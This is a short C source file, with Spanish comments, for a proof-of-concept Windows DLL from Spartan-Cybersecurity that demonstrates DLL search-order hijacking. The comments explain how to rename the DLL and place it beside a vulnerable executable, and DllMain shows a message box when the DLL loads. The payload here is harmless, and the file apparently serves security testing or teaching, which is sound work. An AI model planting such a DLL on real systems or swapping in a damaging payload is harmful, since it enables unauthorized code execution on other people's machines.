// testing.dll
// Esta DLL abrirá una ventana de mensaje cuando sea cargada por cualquier ejecutable.
// Desarrollado por Gerh de Spartan-Cybersecurity 
// Renombra la DLL compilada con el nombre de la DLL que quieres cargar al explotar la vulnerabilidad del orden de búsqueda de DLL
// y colócala en la misma carpeta que el ejecutable vulnerable para aprovechar la vulnerabilidad.

#include <Windows.h>   // Biblioteca principal para funciones de Windows
#include <tchar.h>     // Biblioteca para compatibilidad de texto

// Funcion DllMain: se ejecuta cada vez que la DLL es cargada o descargada
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // Handle al módulo DLL
    DWORD fdwReason,     // Razón por la que se llama a esta función
    LPVOID lpReserved)   // Reservado
{
    // Acciones en base al motivo de la llamada
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:   // Cuando un proceso carga esta DLL
        //  Muestra un mensaje indicando que la DLL maliciosa ha sido ejecutada
        MessageBox(NULL, _T("Spartan-Cybersecurity esta aqui!"), _T("Mensaje"), MB_OK | MB_SYSTEMMODAL);
        break;

        /*
        case DLL_THREAD_ATTACH:    // Cuando un nuevo hilo es creado
        case DLL_THREAD_DETACH:    // Cuando un hilo existente termina
        case DLL_PROCESS_DETACH:   // Cuando el proceso descarga la DLL
        */
    }

    return TRUE;  // Retorna TRUE indicando que DLL_PROCESS_ATTACH fue exitoso
}
